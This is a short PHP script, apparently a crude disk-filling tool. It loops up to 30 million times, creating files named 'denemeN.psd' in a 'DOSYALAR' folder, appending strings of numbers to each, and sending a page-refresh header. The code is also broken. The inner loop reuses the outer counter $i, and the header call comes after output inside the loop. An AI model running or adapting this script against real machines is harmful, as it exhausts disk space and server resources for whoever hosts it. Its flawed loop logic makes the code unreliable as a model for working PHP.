<?php


	for($i=0;$i<=30000000;$i++)
	{
		touch("DOSYALAR\\deneme$i.psd");
		$dosya=fopen("DOSYALAR\\deneme$i.psd","a");
		for($i=0;$i<=30000;$i++)
		fwrite($dosya,"$i");
	header( "refresh:2" );
	}

?>